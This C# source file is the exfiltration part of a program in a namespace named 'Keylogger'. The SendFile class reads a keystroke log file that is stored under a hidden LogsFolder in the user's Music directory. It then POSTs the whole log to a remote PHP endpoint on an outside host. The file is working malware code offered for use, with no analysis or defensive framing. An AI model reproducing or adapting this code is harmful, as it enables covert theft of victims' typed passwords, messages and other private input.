using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Keylogger
{
    class SendFile
    {
        private const string uri = "https://www.klat9.org/Nicolas/Keylogger/sendFile.php";
        private string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\LogsFolder\" + "keylogger.txt";

        public string SendKeyFile(int timeout)
        {
            Console.WriteLine("File Send");
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);

            request.KeepAlive = false;
            request.ProtocolVersion = HttpVersion.Version10;
            request.ContentType = "text/enriched";
            request.Method = "POST";

            StringBuilder sb = new StringBuilder();
            using (StreamReader sr = new StreamReader(filePath))
            {
                String line;
                while ((line = sr.ReadLine()) != null)
                {
                    sb.AppendLine(line);
                }
                byte[] postBytes = Encoding.UTF8.GetBytes(sb.ToString());

                if (timeout < 0)
                {
                    request.ReadWriteTimeout = timeout;
                    request.Timeout = timeout;
                }

                request.ContentLength = postBytes.Length;

                try
                {
                    Stream requestStream = request.GetRequestStream();

                    requestStream.Write(postBytes, 0, postBytes.Length);
                    requestStream.Close();

                    using (var response = (HttpWebResponse)request.GetResponse())
                    {
                        Console.WriteLine(response);
                        return response.ToString();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Failure: " + ex.Message);
                    request.Abort();
                    return string.Empty;
                }

            }
        }
    }
}
